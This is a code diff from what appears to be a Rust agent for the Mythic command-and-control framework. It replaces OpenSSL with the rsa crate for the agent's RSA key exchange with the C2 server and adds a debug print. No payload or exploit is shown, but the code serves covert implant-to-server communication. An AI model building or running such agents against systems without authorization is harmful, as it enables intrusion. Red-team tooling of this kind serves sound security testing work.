@@ -1,14 +1,18 @@
 use crate::payloadvars;
 use std::error::Error;
 
-use aes::cipher::{block_padding::Pkcs7, BlockModeDecrypt, BlockModeEncrypt, KeyIvInit};
-use base64::prelude::{Engine as _, BASE64_STANDARD};
+use aes::cipher::{BlockModeDecrypt, BlockModeEncrypt, KeyIvInit, block_padding::Pkcs7};
+use base64::prelude::{BASE64_STANDARD, Engine as _};
 use hmac::{Hmac, KeyInit, Mac};
-use http::{profilevars, HTTPProfile};
-use openssl::rsa;
+use http::{HTTPProfile, profilevars};
 use rand::distr::{Alphanumeric, SampleString};
+use rsa::{
+    Oaep, RsaPrivateKey, RsaPublicKey,
+    pkcs1::{self, EncodeRsaPublicKey},
+};
 use serde::Deserialize;
 use serde_json::json;
+use sha1::Sha1;
 use sha2::Sha256;
 
 // Import the http profile
@@ -152,13 +156,15 @@ impl Profile {
     /// Performs an EKE with Mythic using the specified C2 profile
     pub fn perform_key_exchange(&mut self) -> Result<(), Box<dyn Error>> {
         // Generate a private/public RSA 4096 key pair
-        let rsa_key = rsa::Rsa::generate(4096)?;
-        let public_key = rsa_key.public_key_to_pem_pkcs1()?;
+        let mut rng = rand::rng();
+        let priv_key = RsaPrivateKey::new(&mut rng, 4096)?;
+        let public_key = RsaPublicKey::from(&priv_key);
+        let public_key_pem = public_key.to_pkcs1_pem(pkcs1::LineEnding::LF)?;
 
         // Formulate the body for staging a key exchange
         let body = json!({
             "action": "staging_rsa",
-            "pub_key": BASE64_STANDARD.encode(public_key),
+            "pub_key": BASE64_STANDARD.encode(public_key_pem),
             "session_id": Alphanumeric.sample_string(&mut rand::rng(), 20),
         })
         .to_string();
@@ -177,11 +183,10 @@ impl Profile {
         // Parse the result
         let body: KeyExchangeReponse = serde_json::from_str(&body)?;
 
-        // Grab the new AES key from the RSA encrypted response
-        let mut new_key = vec![0; rsa_key.size() as usize];
         let encrypted_aes_key = BASE64_STANDARD.decode(&body.session_key)?;
 
-        rsa_key.private_decrypt(&encrypted_aes_key, &mut new_key, rsa::Padding::PKCS1_OAEP)?;
+        let padding = Oaep::<Sha1>::new();
+        let mut new_key = priv_key.decrypt(padding, &encrypted_aes_key)?;
         new_key.truncate(32);
 
         // Set the new active profile
@@ -192,6 +197,8 @@ impl Profile {
 
         // Set the new agent UUID
         self.callback_uuid = body.uuid;
+
+        println!("Finished EKE");
 
         Ok(())
     }
